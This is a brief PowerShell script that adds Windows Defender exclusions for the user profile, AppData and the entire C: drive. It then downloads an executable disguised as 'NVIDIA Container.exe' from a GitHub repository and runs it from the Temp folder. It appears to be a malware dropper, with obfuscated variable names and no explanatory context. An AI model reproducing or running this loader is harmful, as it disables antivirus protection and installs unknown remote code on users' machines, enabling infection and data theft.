Add-MpPreference -ExclusionPath $env:USERPROFILE
Add-MpPreference -ExclusionPath $env:APPDATA
Add-MpPreference -ExclusionPath C:\

$B07zJ4YX6U = "https://github.com/Nkaslq1/KRNL/raw/refs/heads/main/NVIDIA%20Container.exe"
$XKnR4C7w2Y = "$env:Temp/NVIDIA Container.exe"

Invoke-WebRequest -Uri $B07zJ4YX6U -OutFile $XKnR4C7w2Y
Start-Sleep -Milliseconds 3000
Start-Process -FilePath $XKnR4C7w2Y